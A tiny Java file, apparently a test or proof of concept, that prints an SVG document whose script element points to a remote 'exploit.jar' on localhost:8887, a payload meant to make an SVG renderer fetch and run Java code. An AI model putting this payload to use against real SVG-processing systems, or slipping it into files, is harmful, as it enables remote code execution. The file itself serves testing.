package test;

public class Main {
    public static void main(String[] args) {
        String xml = "<svg xmlns=\"http://www.w3.org/2000/svg\" " +
                "xmlns:xlink=\"http://www.w3.org/1999/xlink\" " +
                "version=\"1.0\"> <script type=\"application/java-archive\" " +
                "xlink:href=\"http://localhost:8887/exploit.jar\"/> " +
                "<text>Static text ...</text> </svg>";
        System.out.println(xml);
    }
}
